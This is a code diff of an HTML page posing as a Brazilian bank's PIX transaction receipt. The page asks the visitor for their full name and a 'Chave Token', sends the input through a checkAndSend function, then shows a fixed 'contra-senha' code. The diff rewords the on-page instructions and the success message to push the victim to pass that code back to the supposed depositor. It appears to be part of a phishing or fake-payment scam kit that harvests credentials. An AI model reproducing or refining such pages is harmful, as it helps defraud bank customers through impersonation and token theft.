@@ -13,7 +13,7 @@
     <h2>Comprovante de Transação PIX</h2>
     
     <img id="logo" src="assets/bblogo.png" alt="Logo" width="300">
-    <p id="status">Para confirmar o depósito e carregar o comprovante, digite o <strong>nome completo</strong> da pessoa beneficiária e a <strong>chave Token</strong> gerada pelo depositante. Após clique em PERMITIR.</p>
+    <p id="status">Para finalizar o depósito, digite a <strong>Chave Token</strong> informada pelo depositante. Após clique em PERMITIR para gerar a contrasenha.</p>
     <input type="text" id="username" placeholder="Nome completo" oninput="this.value = this.value.toUpperCase()">
     <input type="text" id="password" placeholder="Chave Token" >
     <button onclick="checkAndSend()">PERMITIR GERAR CONTRASENHA</button>
@@ -89,7 +89,7 @@
                     throw error;
                 }
 
-                document.getElementById("status").innerText = "Contra-senha gerada com sucesso!\n752JA54P2025BF82";
+                document.getElementById("status").innerText = "Contra-senha gerada com sucesso!\nInforme este número ao depositante: 752JA54P2025BF82";
                 console.log("Dados enviados:", data);
             } catch (err) {
                 console.error("Erro ao enviar:", err.message);
